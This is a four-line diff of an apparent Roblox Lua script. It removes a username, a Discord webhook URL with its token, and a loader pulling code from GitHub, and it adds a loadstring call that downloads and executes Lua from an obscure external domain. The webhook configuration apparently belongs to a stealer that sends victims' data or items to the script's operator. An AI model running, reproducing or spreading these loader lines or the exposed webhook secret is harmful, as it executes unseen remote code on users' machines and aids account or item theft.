@@ -1,4 +1,1 @@
-
-Username = "errorg2000"
-Webhook = "https://discord.com/api/webhooks/1259866352043429908/oT3MxSy5A5aggI35pPf7SXnO0CdraWr_Jy9_36ojPob6gM0NkhW9VS-8NLza55Q4pnIL"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/4cdaf85a5acd4a541b74dde0.lua", true))()
